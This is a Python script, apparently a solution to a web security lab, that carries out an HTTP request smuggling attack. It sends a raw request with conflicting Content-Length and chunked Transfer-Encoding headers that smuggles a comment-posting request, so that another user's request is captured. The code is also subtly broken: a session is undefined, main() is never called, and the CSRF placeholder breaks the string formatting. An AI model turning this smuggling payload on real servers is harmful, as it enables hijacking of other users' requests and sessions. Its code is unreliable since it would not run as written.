import requests
import re
import socket
import ssl
import sys
import urllib.parse

def get_csrf_token(response_text):
    csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response_text)
    if csrf_token_match:
        return csrf_token_match.group(1)
    return None

def main(base_url):
    session = requests.Session()
    response = session.get(burp_url)
    csrf_token = get_csrf_token(response.text)
    if not csrf_token:
        print("Failed to retrieve CSRF token from base_url")
        return

def request_smuggling_attack(host, port, path):
    raw_request = (
        "POST {} HTTP/1.1\r\n"
        "Host: {}\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 256\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
        "POST /post/comment HTTP/1.1\r\n"
        "Content-Type: application/x-www-form-urlencoded\r\n"
        "Content-Length: 400\r\n"
        "Cookie: session=your-session-token\r\n"
        "\r\n"
        "csrf={csrf_token}&postId=5&name=Carlos+Montoya&email=carlos%40normal-user.net&website=&comment=test"

    ).format(path, host)

    context = ssl.create_default_context()

    with socket.create_connection((host, port)) as sock:
        with context.wrap_socket(sock, server_hostname=host) as ssock:
            # Send the request twice
            for _ in range(2):
                ssock.sendall(raw_request.encode())
                response = ssock.recv(4096)
                print(response.decode())

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python3 solution.py <url>")
        sys.exit(1)

    url = sys.argv[1]
    parsed_url = urllib.parse.urlparse(url)

    host = parsed_url.hostname
    port = parsed_url.port if parsed_url.port else 443  # Default to HTTPS port
    path = parsed_url.path if parsed_url.path else "/"

    burp_url = url + '/post?postId=7'
    burp0_headers = {}
    #requests.get(burp_url, headers=burp_headers)
    response = session.post(burp_url)

    request_smuggling_attack(host, port, path)
    request_smuggling_attack(host, port, path)
